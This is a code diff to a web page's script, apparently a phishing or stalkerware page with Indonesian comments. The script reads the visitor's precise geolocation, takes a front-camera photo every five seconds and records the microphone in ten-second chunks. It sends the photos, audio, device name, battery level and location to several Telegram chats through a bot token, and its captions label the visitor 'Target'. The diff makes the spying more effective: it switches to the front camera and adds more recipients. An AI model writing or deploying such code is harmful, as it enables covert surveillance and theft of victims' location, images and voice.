@@ -81,24 +81,17 @@
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
-                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                userLoc = `<a href="https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}">📍 Lihat Lokasi (Klik Di Sini)</a>`;
             }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
-        // Jalankan Kamera
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
             setInterval(takeAndSend, 5000);
         } catch (e) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('video').srcObject = stream;
-                setInterval(takeAndSend, 5000);
-            } catch (err) { takeAndSend(); }
+            takeAndSend();
         }
-
-        // Fitur Live Mic (Audio)
         startAudioRecording();
     }
 
@@ -107,34 +100,27 @@
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mediaRecorder = new MediaRecorder(stream);
             let chunks = [];
-
             mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
             mediaRecorder.onstop = () => {
                 const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
                 sendAudioTelegram(blob);
                 chunks = [];
-                mediaRecorder.start(); // Mulai rekam lagi setelah kirim
+                mediaRecorder.start();
             };
-
-            // Rekam setiap 10 detik dan kirim
             mediaRecorder.start();
-            setInterval(() => {
-                if(mediaRecorder.state === "recording") mediaRecorder.stop();
-            }, 10000); 
-
-        } catch (err) {
-            console.log("Mic akses ditolak");
-        }
+            setInterval(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000); 
+        } catch (err) {}
     }
 
     async function sendAudioTelegram(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('voice', blob, 'recording.ogg');
-        fd.append('caption', `🎙 *Audio Target* - ${deviceName}`);
-        fd.append('parse_mode', 'Markdown');
-        
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+        CHAT_IDS.forEach(id => {
+            const fd = new FormData();
+            fd.append('chat_id', id);
+            fd.append('voice', blob, 'recording.ogg');
+            fd.append('caption', `🎙 *Audio Target* - ${deviceName}`);
+            fd.append('parse_mode', 'Markdown');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+        });
     }
 
     async function takeAndSend() {
@@ -147,17 +133,19 @@
         }
 
         const report = (blob) => {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera`);
-            fd.append('parse_mode', 'Markdown');
-            if (blob) {
-                fd.append('photo', blob, 'shot.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } else {
-                fd.append('text', fd.get('caption'));
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
-            }
+            CHAT_IDS.forEach(id => {
+                const fd = new FormData();
+                fd.append('chat_id', id);
+                fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
+                fd.append('parse_mode', 'HTML');
+                if (blob) {
+                    fd.append('photo', blob, 'shot.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } else {
+                    fd.append('text', fd.get('caption'));
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
+                }
+            });
         };
 
         if (video.videoWidth > 0) {
@@ -172,3 +160,4 @@
 </script>
 </body>
 </html>
+
